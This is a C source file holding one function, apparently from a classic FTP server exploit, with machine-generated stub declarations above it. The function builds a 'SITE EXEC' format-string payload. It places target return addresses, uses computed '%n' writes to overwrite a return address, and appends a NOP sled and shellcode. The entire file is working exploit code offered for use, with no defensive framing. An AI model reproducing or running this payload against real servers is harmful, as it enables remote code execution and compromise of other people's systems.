#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {scalar_t__ dawlen; } ;

/* Variables and functions */
 char* fmtstr ; 
 size_t sel ; 
 char* shellcode_read ; 
 int /*<<< orphan*/  sprintf (char*,char*,int) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int strlen (char*) ; 
 TYPE_1__* target ; 
 int /*<<< orphan*/  xpad_cat (char*,unsigned long) ; 

void
fmtstr_build(unsigned long int bufaddr, unsigned long int retloc)
{
int               i;
int		  eat = 136;
int               wlen = 428;
int               tow;
int               freespz;
char		  f[1024];
unsigned long int soul69 = 0x69696969;  /* That's amore.. =) */
unsigned char     retaddr[4];

  for(i = 0; i < 4; ++i)
	retaddr[i] = (bufaddr >> (i << 3)) & 0xff;

  wlen -= target[sel].dawlen;
  f[0] = 0;
  for(i = 0; i < eat; i++)
        strcat(f, "%.f");

  strcat(fmtstr, "SITE EXEC ");
  strcat(fmtstr, "  ");
  xpad_cat(fmtstr, retloc);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 1);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 2);
  xpad_cat(fmtstr, soul69);
  xpad_cat(fmtstr, retloc + 3);
  strcat(fmtstr, f);
  strcat(fmtstr, "%x");

  /* Code by teso
   */
  tow = ((retaddr[0] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;     
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;

  tow = ((retaddr[1] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;

  tow = ((retaddr[2] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;

  tow = ((retaddr[3] + 0x100) - (wlen % 0x100)) % 0x100;
  if (tow < 10) tow += 0x100;
  sprintf (fmtstr + strlen (fmtstr), "%%%dd%%n", tow);
  wlen += tow;
  /* End here
   */

  freespz = 510 - strlen(fmtstr) - strlen(shellcode_read) - 1;
  for(i = 0; i < freespz ; i++)
	strcat(fmtstr, "\x90");
  strcat(fmtstr, shellcode_read);

  strcat(fmtstr, "\n");

}